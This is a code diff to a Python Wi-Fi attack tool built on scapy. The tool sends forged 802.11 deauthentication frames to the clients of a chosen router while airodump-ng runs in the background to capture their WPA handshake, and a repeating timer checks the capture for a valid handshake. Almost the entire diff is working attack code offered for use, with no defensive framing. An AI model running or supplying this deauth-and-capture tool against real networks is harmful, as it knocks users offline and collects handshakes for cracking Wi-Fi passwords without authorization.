@@ -1,31 +1,67 @@
 from scapy.all import *
 import colors
+import time
+import os
+from threading import Timer
+import subprocess
+from multiprocessing import Process
+from glob import glob
+from check_handshake import checkHandshake
+
 
 class Attack(object):
 	"""docstring for Attack"""
-	def __init__(self, targetRouterMac):
+	def __init__(self, targetRouterMac,channel):
 		self.clients = []
 		self.interface = "wlan0mon"
 		self.targetRouterMac = targetRouterMac
+		self.channel = channel
+		self.dir = os.getcwd()
+		self.hasHandshake = False
+		self.hs = Process(target=self.capture_handshake)
+		self.hs.start()
+
+		# starting handshake verifier
+		self.verifier = RepeatTimer(1,self.verify_Handshake)
+		self.verifier.start()
 	def start(self):
 		t = AsyncSniffer(prn=self.find_clients, iface=self.interface)
 		t.start()
 		
+		
 		self.search_client()
+		self.hs.terminate()
+		self.hs.join()
+		self.verifier.cancel()
 		t.stop()
 
 	def search_client(self):
+		print(colors.O + "[-]" + colors.W +" Total clients: "+colors.GR+ str(len(self.clients)) + colors.W)
 		print(colors.O + "[+]" + colors.W + " Searching for clients...")
-		while True:
+		timeout = time.time() + 60*2
+		while self.hasHandshake == False and time.time() < timeout:
+			time.sleep(8)
 			if( len(self.clients) != 0 ):
-				print(colors.B + "[+]" + colors.W +" Found 1 client")
+				print(colors.B + "[+]" + colors.W +" Found client ")
 				self.deauth_clients()
-				break
+				
+
+		if(self.hasHandshake):
+			print(colors.BOLD+colors.B + "[+]" + colors.W +" Captured handshake successfully!")
+			return ''
+		else:
+			print(colors.O + "[-]" + colors.W + " Timeout")
+			return ''
 
 	def deauth_clients(self):
-		for i in self.clients:
-			print(colors.O + "[+]" + colors.W + " Sending Deauth packet to " + colors.GR + str(i) + colors.W)
-			self.deauth(i)
+	
+		if(len(self.clients) != 0):
+			print(colors.O + "[+]" + colors.W + " Sending Deauth packet to: ", end=' ')
+			for i in self.clients:
+				print(colors.BOLD+colors.GR + str(i).upper() + colors.W,end="\r")
+				self.deauth(i)
+	
+
 	def deauth(self,client):
 		packet = RadioTap() / \
          Dot11(type=0,         # Management type
@@ -33,11 +69,11 @@ class Attack(object):
                addr1=client,
                addr2=self.targetRouterMac,
                addr3=self.targetRouterMac) / \
-         Dot11Deauth(reason=7) # "Class 3 frame received from nonassociated STA."
-
+         Dot11Deauth(reason=7) 
          # sending the deauth packet
-		sendp(packet, iface=self.interface)
-		print(colors.O + "[+]" + colors.W + " Deauthenticating ",client)
+		sendp(packet, iface=self.interface,count=5)
+		
+	
 	def find_clients(self,p):
 		if p.haslayer(Dot11):
 			if p.addr1 and p.addr2:                  # if "from" and "to" mac addr. exists
@@ -48,3 +84,39 @@ class Attack(object):
 						if p.addr2 not in self.clients and p.addr2 != '':
 							self.clients.append(p.addr2)
 		
+
+	def capture_handshake(self):
+		try:
+			cmd = ["airodump-ng", "-w", os.path.join(self.dir,'capture'), '--output-format', 'pcap', '--write-interval', '1', '--bssid', self.targetRouterMac, '--channel',str(self.channel) ,"wlan0mon"]
+			handshake = subprocess.call(cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+		except OSError:
+			pass
+		
+
+	def verify_Handshake(self):
+		file = glob("capture*.cap")[0]
+		if(os.path.exists(file)):
+			v = checkHandshake(os.path.join(self.dir,file))
+			self.hasHandshake = v.verify()
+
+	def send_interrupt(process):
+		"""
+        Sends interrupt signal to process's PID.
+		"""
+		try:
+			os.kill(process.pid, SIGINT)
+	        # os.kill(process.pid, SIGTERM)
+		except OSError:
+			pass  # process cannot be killed
+		except TypeError:
+			pass  # pid is incorrect type
+		except UnboundLocalError:
+			pass  # 'process' is not defined
+		except AttributeError:
+			pass  # Trying to kill "None"
+
+
+class RepeatTimer(Timer):
+    def run(self):
+        while not self.finished.wait(self.interval):
+            self.function(*self.args, **self.kwargs)
